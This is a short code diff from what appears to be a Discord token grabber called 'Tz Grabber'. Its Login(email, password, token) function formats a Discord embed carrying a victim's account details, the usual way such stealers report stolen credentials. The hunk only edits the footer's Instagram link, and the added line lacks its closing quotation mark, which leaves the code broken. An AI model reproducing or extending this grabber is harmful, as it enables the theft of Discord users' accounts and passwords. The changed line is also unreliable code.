@@ -163,7 +163,7 @@ function Login(email, password, token) {
                         "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                     },
                     "footer": {
-                        "text": "Tz Grabber ・ https://instagram/tzfofo"
+                        "text": "Tz Grabber ・ https://instagram.com/tzfofo
                     }
                 }
             ]
